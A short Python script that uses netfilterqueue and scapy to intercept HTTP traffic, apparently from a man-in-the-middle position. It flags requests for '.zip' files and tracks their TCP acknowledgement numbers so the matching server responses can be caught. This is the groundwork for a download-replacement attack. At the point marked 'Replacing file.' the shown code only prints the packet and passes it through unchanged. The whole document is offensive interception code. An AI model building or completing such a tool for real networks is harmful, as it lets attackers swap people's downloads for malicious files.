#!/usr/bin/env python

import netfilterqueue
import scapy.layers.inet as inet
import scapy.all as scapy


ack_list = []


def process_packet(packet):
    scapy_packet = inet.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[inet.TCP].dport == 80:
            if ".zip" in scapy_packet[scapy.Raw].load.decode():
                print(".zip request")
                ack_list.append(scapy_packet[inet.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[inet.TCP].sport == 80:
            if scapy_packet[inet.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[inet.TCP].seq)
                print("Replacing file.")
                print(scapy_packet.show())

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nExiting script.\n")
